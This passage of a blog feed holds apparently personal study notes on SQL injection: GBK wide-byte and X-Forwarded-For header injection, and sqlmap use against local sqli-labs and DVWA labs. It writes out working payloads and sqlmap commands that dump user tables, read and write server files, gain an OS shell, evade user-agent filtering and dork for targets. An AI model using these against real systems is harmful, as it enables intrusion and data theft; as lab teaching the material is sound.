      <category term="Mssql 注入" scheme="http://yoursite.com/tags/Mssql-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>笔记36</title>
    <link href="http://yoursite.com/2019/09/02/note36/"/>
    <id>http://yoursite.com/2019/09/02/note36/</id>
    <published>2019-09-02T13:53:19.000Z</published>
    <updated>2019-09-09T06:09:24.195Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>:  <code>SQL</code> 注入之宽字节注入、 <code>HTTP</code> 头注入和其他注入</p><a id="more"></a><!--export--><!--toc--><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p><code>GBK</code> 占用两字节，<code>ASCII</code> 占用一个字节。<code>PHP</code> 中编码为 <code>GBK</code>，函数执行添加的是 <code>ASCII</code> 编码，添加的符号为 <code>&quot;\&quot;</code>，<code>MySQL</code> 默认字符集是 <code>GBK</code> 等宽字节字符集。</p><p><code>%df&#39;</code> 被 <code>PHP</code> 中的 <code>addslashes函数</code>（开启 <code>GPC</code> 或者 <code>iconv()</code>）转义成 <code>%df\&#39;</code> ，其中 <code>\</code> 的十六进制是 <code>%5C</code>，那么现在 <code>%df\&#39;</code> = <code>%df%5C%27</code> ，若程序默认的字符集是 <code>GBK</code> 等宽字节字符集，则 <code>MySQL</code> 用 <code>GBK</code> 编码时，会认为 <code>%df%5c%27</code> 是一个宽字符，即 <code>運&#39;</code>，出现单引号就好注入了。</p><p>宽字节注入，内联注入是无法使用的，宽字节注入推荐使用加前缀 <code>--prefix</code>和后缀 <code>suffix</code> 方法，不推荐写 <code>tamper</code>。</p><p><strong>注意</strong>：</p><ul><li><code>PHP5.3</code>之前，<code>PDO</code> 受宽字节注入影响</li><li>如何防止宽字节注入？<ul><li><code>mysql_set_chartset(&#39;GBK&#39;)</code></li><li><code>mysql_real_escape_string($value)</code></li></ul></li></ul><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p><code>url</code> 编码是一种浏览器用来打包表单输入的格式。<code>url</code> 编码就是一个字符 <code>ascii</code>码的十六进制，不过需要在前面加上 <code>%</code> ，比如 <code>\</code> 的 <code>ascii</code> 是 92（0x5c），故<code>\</code> 的 <code>url</code> 编码为 <code>%5c</code></p><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><ul><li>urldecode()</li><li>rawurldecode()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：默认的 <code>GET</code> 和 <code>POST</code> 函数，先解码一次。</p><h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><h4 id="XFF-注入"><a href="#XFF-注入" class="headerlink" title="XFF 注入"></a>XFF 注入</h4><p><code>X-Forwarded-For</code>：简称 <code>XFF</code> 头，代表客户端，也就是 <code>HTTP</code> 的请求端真实的 <code>IP</code>，通常一些网站防注入功能会记录请求端真实 <code>IP</code> 地址并写入数据库或某文件。通过修改 <code>XFF</code> 头可以实现伪造 <code>IP</code>。</p><p>使用 <code>Modify Headers</code> 可以修改 <code>X-Forwarded-For</code>。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP.png" alt></p><p>通过 <code>burpsuite</code> 抓包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C188.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;:  &lt;code&gt;SQL&lt;/code&gt; 注入之宽字节注入、 &lt;code&gt;HTTP&lt;/code&gt; 头注入和其他注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="宽字节注入" scheme="http://yoursite.com/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    
      <category term="IP 注入" scheme="http://yoursite.com/tags/IP-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>练习12</title>
    <link href="http://yoursite.com/2019/09/02/practice12/"/>
    <id>http://yoursite.com/2019/09/02/practice12/</id>
    <published>2019-09-02T11:34:32.000Z</published>
    <updated>2019-09-09T06:05:00.463Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 练习宽字节注入和请求头 <code>IP</code> 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>打开 <code>burpsuite</code> 抓取数据包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver.png" alt></p><p>在 <code>username</code> 后面加上 <code>%df%27</code>，请求页面，发现没有变化，主要是因为 <code>POST</code> 传输不需要 <code>URL</code> 解码，点击 <code>Hex</code>，找到 <code>username</code> 的位置，把 <code>1</code> 后面的字符改成  <code>df</code> 和 <code>27</code> </p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver1.png" alt></p><p>返回查看数据，把多余的字符删除。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver2.png" alt></p><p>点击 <code>Go</code>，查看 <code>Response</code>，发现页面变化了，即找到了注入点。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver3.png" alt></p><p>尝试使用时间注入，修改 <code>Request</code> 如下，</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver4.png" alt></p><p>点击 <code>Go</code> 发现页面，没有延迟。很可能是 <code>.ova</code> 文件导入过来，数据库并没有数据造成的，在网页上注册一个用户，再次运行，可以发现响应延迟了 <code>1s</code> 左右。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver5.png" alt></p><p>删除多余的 <code>*</code>，再在我们想要注入的地方加入 <code>*</code>，右击保存文件。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver6.png" alt></p><p>接下来，使用 <code>sqlmap</code> 测试。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r Desktop\wideType.txt <span class="comment"># wideType.txt 存放的是HTTP响应的数据</span></span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver7.png" alt></p><p>可以发现漏洞，但是最新版的 <code>sqlmap</code> 在脱裤时，会出现问题。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\wideType.txt"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C186driver8.png" alt></p><h3 id="请求头-IP-注入"><a href="#请求头-IP-注入" class="headerlink" title="请求头 IP 注入"></a>请求头 <code>IP</code> 注入</h3><p>数据库中更新用户 <code>IP</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 更新 IP</span><br><span class="line">UPDATE  USER SET last_loginip=&apos;8.8.8.8&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><p>想要注入，首先得进行前 <code>&#39;</code> 的闭合和注释掉后 <code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE USER SET last_loginip=&apos;8.8.8.8&apos; /*此处插入想要执行的语句*/ #&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE USER SET last_loginip=&apos;8.8.8.8&apos; and WHERE id=1 and sleep(5) #&apos; WHERE `username`=&apos;zhang&apos;;</span><br></pre></td></tr></table></figure><p>使用 <code>Modify Headers</code> 添加 <code>X-Forwarded-For</code> 设置为 <code>8.8.8.8&#39;</code>，先注册一个用户。用户名 <code>123</code>，密码 <code>123</code>。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP.png" alt></p><p>用 <code>burpsuite</code> 抓取数据包</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP1.png" alt></p><p>在 <code>X-Forwarded-For</code> 后面补充 <code>where 1=1 and sleep(5)</code>，点击 <code>Go</code></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP2.png" alt></p><p>等待 <code>5s</code> 后，页面有响应。由此可找到注入点，把 <code>where id=1 and sleep(5)</code> 改成 <code>where id = 1 *</code> ，删除请求其他 <code>*</code> 号，保存到文件里。开始用 <code>sqlmap</code> 执行 <code>payload</code>。</p><p>把注入点修改为 <code>where 1=1 or sleep(5)</code> 页面没有延迟，原因是 <code>1=1 or sleep(5)</code> 短路原理，故 <code>sleep(5)</code> 压根就没有执行。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C189.png" alt></p><p>使用 <code>where 1=1 and sleep(5)</code> ，我们可以看出来延迟了将近 <code>15s</code>。关于 <code>1=1 or 条件</code> 和 <code>1=2 and 条件</code> 的短路原理，在前几篇文章写过，但真正在实战中确实还是容易忘掉。</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C190.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\ip.txt"</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(custom) HEADER parameter <span class="string">'X-Forwarded-For #1*'</span> appears to be <span class="string">'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'</span> injectable</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP3.png" alt></p><p>可以使用 <code>--technique T</code> 指定时间注入，缩短时间。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r <span class="string">"C:\Users\han\Desktop\ip.txt"</span> --technique T --dbs</span><br></pre></td></tr></table></figure><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C187httpIP4.png" alt></p><h3 id="问题与总结"><a href="#问题与总结" class="headerlink" title="问题与总结"></a>问题与总结</h3><p>关于 <code>SQLmap</code> 自定义注入点的思考：</p><ol><li>先通过 <code>burpsuite</code> 抓取数据包，尝试找到注入点。</li><li>找到注入点后，分析使用布尔盲注还是时间盲注，在 <code>burpsuite</code> 中的 <code>Repeater</code> 模块中通过在请求内容中增加 <code>SQL</code> 语句尝试。</li><li>在注入点中，把添加 <code>SQL</code> 语句中能够做修改的地方改写成 <code>*</code>。<ul><li>在<code>老司机</code>例子中，定位到  <code>username</code> 存在宽字节注入，后面写上 <code>or if((select 1 and 1=1), sleep(3), 1)</code> 发现响应延迟，那 <code>payload</code> 该放在那呢？首先能够确定的是，必然在 <code>select 1 and 1=1</code> 这句话里面，<code>if</code> 关键字第一个表达式必须是布尔型，所以直接在 <code>1=1</code> 加 <code>*</code> 号即可。</li><li>在 <code>留言板</code> 例子中，通过对 <code>SQL</code> 语句的猜想，可以知道要在 <code>X-Forwarded-For: 8.8.8.8&#39;</code> 后面加上 <code>where 1=1 and sleep(5) #</code> 在本例中，可以修改为 <code>where 1=1*</code> 即可。</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 练习宽字节注入和请求头 &lt;code&gt;IP&lt;/code&gt; 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="宽字节注入" scheme="http://yoursite.com/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
    
      <category term="IP 注入" scheme="http://yoursite.com/tags/IP-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>练习11</title>
    <link href="http://yoursite.com/2019/08/31/practice11/"/>
    <id>http://yoursite.com/2019/08/31/practice11/</id>
    <published>2019-08-31T03:08:50.000Z</published>
    <updated>2019-09-09T05:33:20.260Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>SQLMap</code>的应用，使用<code>sqli-labs</code> 和 <code>dvwa</code> 作为实验平台。</p><a id="more"></a><!--export--><!--toc--><h3 id="用-SQLMap-查看数据库"><a href="#用-SQLMap-查看数据库" class="headerlink" title="用 SQLMap 查看数据库"></a>用 <code>SQLMap</code> 查看数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/156sql-dbs.png" alt></p><p>得出结果：</p><p><img src="/images/157sql-dbs-result.png" alt></p><h3 id="查看-security-库中的表"><a href="#查看-security-库中的表" class="headerlink" title="查看 security 库中的表"></a>查看 <code>security</code> 库中的表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security --tables</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/158sql-sec-tables.png" alt></p><h3 id="查看-users-表中所有的字段名"><a href="#查看-users-表中所有的字段名" class="headerlink" title="查看  users 表中所有的字段名"></a>查看  <code>users</code> 表中所有的字段名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security -T  users --columns</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/159sql-sec-users-columns.png" alt></p><h3 id="查看-security-users-表中的内容"><a href="#查看-security-users-表中的内容" class="headerlink" title="查看 security.users 表中的内容"></a>查看 <code>security.users</code> 表中的内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-8/?id=1"</span> -D security -T  users -C id,password,username --dump</span><br></pre></td></tr></table></figure><p>得出结果：</p><p><img src="/images/160dump.png" alt></p><h3 id="使用-method-和-POST-参数"><a href="#使用-method-和-POST-参数" class="headerlink" title="使用 method 和 POST 参数"></a>使用 <code>method</code> 和 <code>POST</code> 参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-11/"</span> --method=<span class="string">"post"</span> --data=<span class="string">"uname=admin&amp;passwd=admin"</span> --dbs</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="/images/162method_data.png" alt></p><h3 id="使用-cookie"><a href="#使用-cookie" class="headerlink" title="使用 cookie"></a>使用 <code>cookie</code></h3><p>在 <code>/sqli-labs/Less-11</code> 中，由于只涉及登录功能，没有登录以后的操作，所以用 <code>--cookie</code> 无法抓取相应数据。 故使用 <code>dvwa</code> 测试。</p><p>登录账号，查看 <code>cookie</code> </p><p><img src="/images/165cookie.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/DVWA/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low; PHPSESSID=ar14vrf1ie0kc399hgpmqc1fd2"</span> --dbs</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="/images/166cookie1.png" alt></p><p><img src="/images/166cookie2.png" alt></p><p><img src="/images/166cookie3.png" alt></p><p><img src="/images/166cookie4.png" alt></p><h3 id="使用-user-agent"><a href="#使用-user-agent" class="headerlink" title="使用 user-agent"></a>使用 <code>user-agent</code></h3><p>打开 <code>/sqli-labs/Less-1</code> 中的 <code>index.php</code> ，添加如下程序。</p><p><img src="/images/167user_agent.png" alt></p><p>即当程序检测到 <code>user-agent</code> 值为 <code>bp</code> 时，直接退出程序。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --user-agent=<span class="string">"bp"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/168bp.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --user-agent=<span class="string">"sqlmap"</span> --dbs</span><br></pre></td></tr></table></figure><p><img src="/images/169sqlSec.png" alt></p><p><img src="/images/170sqlSec.png" alt></p><p>把添加的语句删除，保存退出，重新用 <code>sqlmap</code> 尝试读取数据库信息</p><p><img src="/images/171sqlbpSec.png" alt></p><p><img src="/images/171sqlbpSec1.png" alt></p><p>爬取数据库成功，由此可见，命令行设置 <code>--user-agent</code>是起到一定作用， 有些网站通过对 <code>user-agent</code>参数的检测，达到对 <code>SQLMap</code> 的屏蔽。</p><p><strong>注意</strong>：每次完成后，记住对 <code>/sqlmap/output/</code> 文件夹下对应目录的清理。</p><p>另一种方法是设置代理用 <code>burpsuite</code> 抓包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-3/?id=1"</span> --user-agent=<span class="string">"burpsuite"</span> --proxy=<span class="string">"http://127.0.0.1:8080"</span></span><br></pre></td></tr></table></figure><p>打开 <code>burpsuite</code> 抓取 <code>sqlmap</code> 数据包</p><p><img src="/images/184proxy.png" alt></p><p><img src="/images/185proxy.png" alt></p><p>可以看到 <code>user-agent</code> 变为我们设置的值了。</p><h3 id="sqlmap-读文件"><a href="#sqlmap-读文件" class="headerlink" title="sqlmap 读文件"></a><code>sqlmap</code> 读文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-1/?id=1"</span> --file-read=<span class="string">"/var/www/html/sqli-labs/index.html"</span></span><br></pre></td></tr></table></figure><p><img src="/images/172sqlmap_read.png" alt></p><p><img src="/images/172sqlmap_read1.png" alt></p><p><img src="/images/172sqlmap_read2.png" alt></p><p>点击查看读取的文件</p><p><img src="/images/172sqlmap_read3.png" alt></p><p>打开文件</p><p><img src="/images/172sqlmap_read4.png" alt></p><h3 id="sqlmap-写文件"><a href="#sqlmap-写文件" class="headerlink" title="sqlmap 写文件"></a><code>sqlmap</code> 写文件</h3><p>在本地新建 <code>hack.php</code> 文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-1/?id=1"</span> --file-write=<span class="string">"hack.php"</span> --file-dest=<span class="string">"/var/myfile/hack.php"</span> -v 5</span><br></pre></td></tr></table></figure><p>在服务器中查看</p><p><img src="/images/173sqlmap_write.png" alt></p><h3 id="sqlmap-执行-sql语句"><a href="#sqlmap-执行-sql语句" class="headerlink" title="sqlmap 执行 sql语句"></a><code>sqlmap</code> 执行 <code>sql</code>语句</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low; PHPSESSID=ri8va1c84en9d40b7l1o1lle53"</span> --sql-shell</span><br></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @@datadir;</span><br><span class="line">select user();</span><br></pre></td></tr></table></figure><p><img src="/images/173sqlmp_sqlcmd.png" alt></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C173sqlmap_sqlcmd1.png" alt></p><h3 id="sqlmap-g"><a href="#sqlmap-g" class="headerlink" title="sqlmap -g"></a><code>sqlmap -g</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -g <span class="string">"inurl:?id=1"</span></span><br></pre></td></tr></table></figure><p><img src="/images/174sqlmap_g.png" alt></p><h3 id="sqlmap-r"><a href="#sqlmap-r" class="headerlink" title="sqlmap -r"></a><code>sqlmap -r</code></h3><p>打开 <code>burpsuite</code> 抓包，</p><p><img src="/images/175sqlmap_r.png" alt></p><p>把 <code>Request</code> 里面的内容，复制粘贴到 <code>less12.txt</code> 中，打开 <code>sqlmap</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r less12.txt</span><br></pre></td></tr></table></figure><p><img src="/images/176sqlmap_r.png" alt></p><p><img src="/images/177sqlmap-r.png" alt></p><h3 id="sqlmap-os-shell"><a href="#sqlmap-os-shell" class="headerlink" title="sqlmap --os-shell"></a><code>sqlmap --os-shell</code></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.119/sqli-labs/Less-1/?id=1"</span> --os-shell</span><br></pre></td></tr></table></figure><p>用 <code>sqli-labs</code> 和 <code>dvwa</code> 都会提示</p><p><img src="/images/178error.png" alt></p><p>尝试了 <code>Window</code> 和 <code>CentOS</code> 系统，还是失败。在网上搜到参考文章，照着修改权限，依然没有成功。</p><p><em>参考文章</em></p><blockquote><p><a href="https://blog.csdn.net/lplp9822/article/details/84112979" target="_blank" rel="noopener">DVWA(linux下)利用sqlmap进行–os-shell注入不能成功的错误处理</a></p></blockquote><p>最后</p><p>在虚拟机中把，html 文件夹权限修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/</span><br><span class="line">chmod 777 html</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.100.52/sqli-labs/Less-3/?id=1"</span> --os-shell</span><br></pre></td></tr></table></figure><p><img src="/images/182os-shell.png" alt></p><p><img src="/images/183os-shel.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: &lt;code&gt;SQLMap&lt;/code&gt;的应用，使用&lt;code&gt;sqli-labs&lt;/code&gt; 和 &lt;code&gt;dvwa&lt;/code&gt; 作为实验平台。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="SQL盲注" scheme="http://yoursite.com/tags/SQL%E7%9B%B2%E6%B3%A8/"/>
    
  </entry>
  
</feed>
